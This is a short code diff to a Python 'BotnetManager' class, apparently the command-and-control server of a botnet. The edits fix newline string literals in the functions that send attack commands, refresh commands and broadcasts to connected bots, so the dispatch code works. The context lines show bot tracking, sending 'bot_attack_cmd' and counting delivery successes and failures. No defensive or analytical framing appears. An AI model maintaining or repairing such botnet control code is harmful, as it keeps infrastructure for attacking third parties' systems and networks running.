@@ -223,8 +223,7 @@ class BotnetManager:
             }
 
             try:
-                await self._send_to_writer(writer, json.dumps(bot_attack_cmd) + "
-")
+                await self._send_to_writer(writer, json.dumps(bot_attack_cmd) + "\n")
                 sent_count += 1
             except Exception as e:
                 failed_count += 1
@@ -289,8 +288,7 @@ class BotnetManager:
             }
 
             try:
-                await self._send_to_writer(writer, json.dumps(refresh_cmd) + "
-")
+                await self._send_to_writer(writer, json.dumps(refresh_cmd) + "\n")
                 sent_count += 1
             except Exception as e:
                 logger.error(f"[REFRESH] Failed to send to bot {bot_id}: {e}")
@@ -315,8 +313,7 @@ class BotnetManager:
 
         logger.info(f"Broadcasting command '{command.get('cmd')}' to {len(writers)} bots: {bot_ids}")
 
-        cmd_json = json.dumps(command) + "
-"
+        cmd_json = json.dumps(command) + "\n"
         excluded_set = set(exclude) if exclude else set()
         tasks = []
         async with self._lock:
@@ -336,8 +333,7 @@ class BotnetManager:
             writer = self.active_writers.get(bot_id)
             if not writer or writer.is_closing():
                 return False
-        cmd_json = json.dumps(command) + "
-"
+        cmd_json = json.dumps(command) + "\n"
         return await self._send_to_writer(writer, cmd_json)
 
     async def get_bot_stats(self) -> BotStats:
